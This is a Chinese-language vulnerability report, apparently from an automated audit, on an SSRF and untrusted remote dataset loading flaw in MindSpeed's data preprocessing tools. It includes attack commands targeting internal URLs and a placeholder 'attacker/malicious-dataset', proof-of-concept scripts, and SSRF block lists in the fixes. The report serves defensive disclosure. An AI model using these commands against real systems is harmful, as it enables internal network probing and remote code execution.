# VULN-CROSS-TOOLS-DATA-LOAD-001：数据预处理工具SSRF致不可信远程数据集加载风险

## 漏洞元数据

| 字段 | 值 |
|------|-----|
| **漏洞ID** | VULN-CROSS-TOOLS-DATA-LOAD-001 |
| **类型** | 服务端请求伪造 (SSRF) / 不可信数据加载 (CWE-918) |
| **严重性** | High |
| **置信度** | 85% |
| **CWE** | CWE-918：服务端请求伪造 (SSRF) |
| **受影响文件** | `tools/preprocess_data.py`, `tools/data_handler.py` |
| **受影响函数** | `build_dataset()` @ tools/data_handler.py:505-554 |
| **入口点** | `main()` @ tools/preprocess_data.py:172-188 |
| **信任级别** | untrusted_local (CLI) → remote_server |

## 执行摘要

数据预处理 CLI 工具 (`preprocess_data.py`) 接收用户控制的 `--input` 参数，跨文件流向 `data_handler.py` 的 `build_dataset()` 函数，后者直接将该值传递给 HuggingFace 的 `load_dataset()` 进行远程数据集获取。当输入路径本地不存在时（第 516 行：`os.path.exists(args.input)` 返回 False），代码假设其为 HuggingFace 数据集名称，无任何验证地从远程服务器获取数据，导致 SSRF 攻击和通过 HuggingFace Hub 恶意数据集的潜在远程代码执行。

## 漏洞代码分析

### 入口点：tools/preprocess_data.py (第 87-88, 172-179 行)

```python
# 参数定义 - 接收任意字符串作为输入
group.add_argument('--input', type=str,
                   help='Path to input JSON or path or a huggingface dataset name')

# main 函数 - 直接传递用户输入给 build_dataset
def main():
    args = get_args()  # 解析命令行，包括 --input
    # ...
    logger.info("building dataset: %s", args.input)
    raw_data = build_dataset(args)  # 跨文件数据流：args.input → build_dataset
```

### 危险点：tools/data_handler.py (第 505-554 行)

```python
def build_dataset(args):
    """loading dataset by huggingface"""
    # ... (第 507-513 行处理 --hf-datasets-params，由 VULN-tools-load_dataset-001 覆盖)
    
    cache_dir = DEFAULT_CACHE_DIR
    split_flag = "train"
    
    # 漏洞点：信任决策仅基于本地文件存在性
    load_from_local = os.path.exists(args.input)  # 第 516 行
    
    if load_from_local:
        # ... 本地文件处理（由 VULN-tools-load_dataset-003 覆盖）
    else:
        # SSRF 漏洞：无验证的远程数据集加载
        logger.info("loading data from remote huggingface")
        raw_datasets = load_dataset(
            args.input,          # 用户控制：任意字符串可传入
            split=split_flag,
            num_proc=None if args.streaming else args.workers,
            cache_dir=cache_dir,
            streaming=args.streaming
        )  # 第 547-553 行
    return raw_datasets
```

### 信任边界违规

```
┌────────────────────────────────────────────────────────────────────────────────┐
│ 信任边界：CLI (本地，不可信) → 远程服务器 (外部，不可信)                          │
└────────────────────────────────────────────────────────────────────────────────┘

[本地用户上下文]                    [远程服务器上下文]
      │                                      │
      │ args.input                           │
      │ (不可信字符串)                        │
      ├──────────────────────────────────────┤
      │                                      │
      │  os.path.exists() == False           │
      │                                      │
      │         ┌────────────────────────────┼──→ HuggingFace Hub
      │         │                            │
      │         │  load_dataset(args.input)  │
      │         │                            │
      │         └────────────────────────────┼──→ 任意远程 URL
      │                                      │
      │                                      │
```

## 数据流分析

### 完整跨文件数据流路径

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ 文件：tools/preprocess_data.py                                              │
│                                                                             │
│ argv (命令行参数)                                                            │
│     │                                                                       │
│     ▼                                                                       │
│ argparse.parse_args() [第 157 行]                                           │
│     │                                                                       │
│     ▼                                                                       │
│ args.input (用户控制字符串)                                                  │
│     │                                                                       │
│     ▼                                                                       │
│ main() → build_dataset(args) [第 179 行]                                    │
└─────────────────────────────────────────────────────────────────────────────┘
                                     │
                                     │ 跨文件边界
                                     ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ 文件：tools/data_handler.py                                                 │
│                                                                             │
│ build_dataset(args) [第 505 行]                                             │
│     │                                                                       │
│     ▼                                                                       │
│ load_from_local = os.path.exists(args.input) [第 516 行]                    │
│     │                                                                       │
│     │ if False (文件本地不存在)                                             │
│     ▼                                                                       │
│ load_dataset(args.input) [第 547-553 行]                                    │
│     │                                                                       │
│     ▼                                                                       │
│ ┌───────────────────────────────────────────────────────────────────────┐   │
│ │ 远程数据获取：                                                          │   │
│ │ - HuggingFace Hub 数据集                                               │   │
│ │ - 来自远程 URL 的任意数据集                                             │   │
│ │ - 可能包含嵌入代码的恶意数据集                                           │   │
│ └───────────────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 调用图证据

来自 `scan-results/.context/call_graph.json`：
```json
{
  "source": "argv@tools/preprocess_data.py",
  "path": ["main@tools/preprocess_data.py", "build_dataset@tools/data_handler.py"],
  "sink": "load_dataset@tools/data_handler.py",
  "sink_type": "file_load",
  "description": "命令行参数到数据集加载"
}
```

## 攻击场景

### 场景 1：通过 HuggingFace 数据集名称 SSRF

**攻击向量**：滥用 HuggingFace datasets 库的 URL 处理能力。

```bash
# 步骤 1：构造触发远程加载的输入
python tools/preprocess_data.py \
    --input "http://internal-server:8080/sensitive-data" \
    --tokenizer-type GPT2BPETokenizer \
    --output-prefix ./output
```

**攻击结果**：
- 工具尝试从指定 URL 获取数据
- 若 `http://internal-server` 是外部无法访问的内部资源，这构成 SSRF
- 攻击者可探测内部网络拓扑

### 场景 2：通过恶意 HuggingFace 数据集远程代码执行

**攻击向量**：在 HuggingFace Hub 创建包含可执行代码的恶意数据集。

```bash
# 步骤 1：攻击者向 HuggingFace Hub 发布恶意数据集
# 数据集名称："attacker/malicious-dataset"
# 数据集包含嵌入恶意软件的加载脚本

# 步骤 2：受害者使用恶意数据集运行预处理工具
python tools/preprocess_data.py \
    --input "attacker/malicious-dataset" \
    --tokenizer-type GPT2BPETokenizer \
    --output-prefix ./output

# 步骤 3：HuggingFace datasets 库：
# - 下载数据集加载脚本
# - 执行脚本（除非显式设置 trust_remote_code=False）
# - 恶意代码以受害者权限运行
```

**注意**：新版 `datasets` 库需要 `trust_remote_code=True` 才能执行，但：
1. 代码未显式设置 `trust_remote_code=False`
2. 默认行为因版本而异
3. 用户可能通过 `--hf-datasets-params` 被诱骗添加此参数（由 VULN-tools-load_dataset-001 覆盖）

### 场景 3：数据投毒攻击

**攻击向量**：在 HuggingFace Hub 投毒热门数据集（或创建伪装品）。

```bash
# 步骤 1：攻击者修改或创建含投毒数据的数据集
# - 向训练数据注入恶意提示
# - 在文本样本中包含后门触发器
# - 添加利用 tokenizer 漏洞的样本

# 步骤 2：受害者不知不觉处理投毒数据
python tools/preprocess_data.py \
    --input "popular/legitimate-looking-dataset" \
    --tokenizer-type PretrainedFromHF \
    --tokenizer-name-or-path gpt2 \
    --output-prefix ./training_data

# 步骤 3：投毒数据进入训练管道
# - 训练模型学习恶意模式
# - 模型展现攻击者控制行为
```

## PoC 构造思路

### 概念验证 1：SSRF 检测

```python
# test_ssrf_detection.py
import subprocess
import time

# 启动简单内部服务器测试
internal_server = subprocess.Popen(['python', '-m', 'http.server', '8888'], 
                                   cwd='/tmp', stdout=subprocess.PIPE)

# 创建标记文件
open('/tmp/marker.txt', 'w').write('INTERNAL_RESOURCE')

# 运行漏洞工具目标内部服务器
result = subprocess.run([
    'python', 'tools/preprocess_data.py',
    '--input', 'http://localhost:8888/marker.txt',
    '--tokenizer-type', 'GPT2BPETokenizer',
    '--output-prefix', '/tmp/test_output'
], capture_output=True, text=True)

# 检查工具是否尝试访问内部资源
if 'localhost:8888' in result.stderr or result.returncode != 0:
    print("SSRF 漏洞确认 - 工具尝试远程获取")

internal_server.terminate()
```

### 概念验证 2：恶意数据集检测

```bash
# 使用已知 HuggingFace 数据集验证远程加载行为
python tools/preprocess_data.py \
    --input "imdb" \  # 已知 HuggingFace 数据集
    --tokenizer-type GPT2BPETokenizer \
    --output-prefix ./test_output \
    --seq-length 128

# 检查日志："loading data from remote huggingface" 确认 SSRF 路径触发
# 检查缓存目录远程获取证据
ls ~/tmp/datasets/imdb*
```

## 安全影响评估

### 影响类别

| 类别 | 严重性 | 描述 |
|------|--------|------|
| **机密性** | HIGH | 内部网络资源可能通过 SSRF 探测 |
| **完整性** | HIGH | 恶意数据集可投毒训练数据 |
| **可用性** | MEDIUM | 对不可用资源的网络请求导致挂起 |
| **远程代码执行** | HIGH | 若数据集包含可执行代码（结合 VULN-tools-load_dataset-001） |

### 攻击要求

| 要求 | 级别 | 说明 |
|------|------|------|
| 所需权限 | Low | 用户级 CLI 访问 |
| 用户交互 | Required | 受害者必须运行预处理工具 |
| 攻击复杂度 | Low | 简单命令行操作 |
| 范围 | Changed | 可影响内部网络、训练管道 |

## 缺失缓解措施分析

### 当前状态：无安全控制

| 缓解措施 | 状态 | 预期位置 | 实际状态 |
|----------|------|----------|----------|
| 输入验证 | MISSING | build_dataset() | ❌ 无 |
| URL/域名白名单 | MISSING | build_dataset() | ❌ 无 |
| trust_remote_code=False | MISSING | load_dataset() 调用 | ❌ 未设置 |
| 网络访问控制 | MISSING | build_dataset() | ❌ 无 |
| 安全警告 | MISSING | build_dataset() | ❌ 无 |
| 数据集验证 | MISSING | build_dataset() | ❌ 无 |

### 与项目其他安全措施对比

项目在其他位置展现了对 `trust_remote_code` 风险的意识：

```python
# mindspeed/tokenizer/tokenizer.py (第 75 行)
hf_tokenizer_kwargs["trust_remote_code"] = False  # 安全

# mindspeed/tokenizer/build_tokenizer/adaptor.py (第 58 行)
hf_tokenizer_kwargs["trust_remote_code"] = False  # 安全

# tools/data_handler.py (第 547-553 行)
load_dataset(args.input, ...)  # 漏洞点：无 trust_remote_code 控制！
```

## 相关漏洞

此漏洞相关但区别于：

| 漏洞ID | 聚焦点 | 关系 |
|--------|--------|------|
| VULN-tools-load_dataset-001 | 通过 `--hf-datasets-params` 参数注入 | 相同危险点，不同数据源 |
| VULN-tools-load_dataset-003 | 本地 Python 脚本执行 | 相同文件，不同代码路径 |

**关键区别**：此漏洞专门覆盖当 `--input` 不是本地文件时的 SSRF 路径，触发远程数据集获取。

## 修复建议

### 优先级 1：添加 trust_remote_code 保护

```python
# tools/data_handler.py - build_dataset() 修改
def build_dataset(args):
    """loading dataset by huggingface"""
    # ... 现有代码 ...
    
    if not load_from_local:
        logger.info("loading data from remote huggingface")
        
        # 安全：显式禁用远程代码执行
        raw_datasets = load_dataset(
            args.input,
            split=split_flag,
            num_proc=None if args.streaming else args.workers,
            cache_dir=cache_dir,
            streaming=args.streaming,
            trust_remote_code=False  # 关键：防止远程数据集代码执行
        )
    return raw_datasets
```

### 优先级 2：添加输入验证和白名单

```python
# tools/data_handler.py
import re

ALLOWED_HF_DATASET_PATTERN = re.compile(r'^[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+$')
ALLOWED_HF_ORGS = ['openai', 'google', 'facebook', 'microsoft', 'allenai', 'huggingface']

def _validate_remote_dataset_name(dataset_name):
    """验证数据集名称来自可信来源。"""
    if not ALLOWED_HF_DATASET_PATTERN.match(dataset_name):
        raise ValueError(f"无效数据集名称格式: {dataset_name}")
    
    org = dataset_name.split('/')[0]
    if org not in ALLOWED_HF_ORGS:
        logger.warning(f"从非白名单组织加载数据集: {org}")
        # 可选要求显式用户确认
    
    return True

def build_dataset(args):
    # ...
    if not load_from_local:
        # 安全：加载前验证远程数据集名称
        _validate_remote_dataset_name(args.input)
        raw_datasets = load_dataset(
            args.input,
            split=split_flag,
            trust_remote_code=False,
            # ... 其他参数
        )
```

### 优先级 3：添加 URL 输入 SSRF 保护

```python
# tools/data_handler.py
import urllib.parse

BLOCKED_URL_SCHEMES = ['file', 'ftp', 'gopher', 'ldap']
BLOCKED_URL_PATTERNS = ['localhost', '127.', '10.', '192.168.', '172.', '.internal', '.local']

def _validate_url_safety(url_or_dataset):
    """防止 URL 输入 SSRF 攻击。"""
    parsed = urllib.parse.urlparse(url_or_dataset)
    
    # 阻止危险协议
    if parsed.scheme in BLOCKED_URL_SCHEMES:
        raise ValueError(f"阻止的 URL 协议: {parsed.scheme}")
    
    # 阻止内部/私有 IP 模式
    for pattern in BLOCKED_URL_PATTERNS:
        if pattern in parsed.netloc:
            raise ValueError(f"阻止的内部 URL: {parsed.netloc}")
    
    return True
```

### 优先级 4：添加安全文档

更新 `SECURITYNOTE.md`：

```markdown
### 远程数据集加载安全警告

当 `--input` 参数指定一个非本地路径时，工具将从 HuggingFace Hub 或远程服务器加载数据集。
请确保：

1. 仅使用来自可信组织的数据集（如 openai, google, facebook, allenai）
2. 检查数据集的下载量和社区评分
3. 验证数据集的来源和作者信誉
4. 不要使用包含自定义加载脚本的数据集（除非已验证其安全性）

SSRF风险：工具可能尝试访问内部网络资源，请勿将内部URL作为输入。
```

## 验证状态

| 检查项 | 状态 | 证据 |
|--------|------|------|
| 漏洞已确认 | ✅ Yes | 代码分析显示无验证 |
| 跨文件数据流已验证 | ✅ Yes | call_graph.json 确认流向 |
| SSRF 路径已识别 | ✅ Yes | 第 545-553 行触发远程获取 |
| 缓解措施缺失 | ✅ Yes | 无 trust_remote_code，无 URL 验证 |
| 攻击现实可行 | ✅ Yes | HuggingFace Hub 常被使用 |

## 元数据

- **分析者**：details-worker
- **分析日期**：2026-04-20
- **项目**：MindSpeed
- **仓库**：/home/pwn20tty/Desktop/opencode_project/shenteng/MindSpeed/MindSpeed
- **跨文件分析**：tools/preprocess_data.py → tools/data_handler.py
- **信任边界**：本地 CLI → 远程服务器 (HuggingFace Hub)

## 参考资料

- **CWE-918**：服务端请求伪造 (SSRF) - https://cwe.mitre.org/data/definitions/918.html
- **HuggingFace Datasets 安全**：https://huggingface.co/docs/datasets/security
- **HuggingFace trust_remote_code**：https://huggingface.co/docs/datasets/main/en/package_reference/loading_methods#datasets.load_dataset.trust_remote_code
- **ML 管道中的 SSRF**：ML 工具中报告的类似漏洞（torch.load，模型加载）

---